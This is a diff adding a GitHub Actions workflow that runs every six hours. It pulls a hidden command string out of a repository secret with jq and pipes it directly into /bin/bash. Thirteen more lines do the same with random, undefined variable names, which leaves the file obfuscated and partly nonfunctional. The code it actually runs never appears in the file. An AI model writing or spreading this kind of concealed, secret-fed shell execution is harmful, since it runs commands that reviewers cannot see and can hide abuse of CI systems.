@@ -1,0 +1,30 @@
+name: gucchengguyun
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: gucchengguyun
+        env:
+          jd812: ${{ secrets.jd812 }}
+        run: |
+          echo $jd812 | jq -r .gcx54 | /bin/bash
+          echo $iih65502 | jq -r .pmm9 | /bin/bash
+          echo $cz224 | jq -r .dd1 | /bin/bash
+          echo $p410 | jq -r .xadq754 | /bin/bash
+          echo $kr10 | jq -r .skj4600 | /bin/bash
+          echo $igkr73058 | jq -r .qg8 | /bin/bash
+          echo $zb0732 | jq -r .f40 | /bin/bash
+          echo $ahfq89 | jq -r .tgo4424 | /bin/bash
+          echo $ndbx21615 | jq -r .also5171 | /bin/bash
+          echo $gpae840 | jq -r .yzq09 | /bin/bash
+          echo $t20917 | jq -r .ge11 | /bin/bash
+          echo $usxp2 | jq -r .xcnc6488 | /bin/bash
+          echo $krtko570 | jq -r .vva80 | /bin/bash
+          echo $sbq4316 | jq -r .alyc16060 | /bin/bash
+
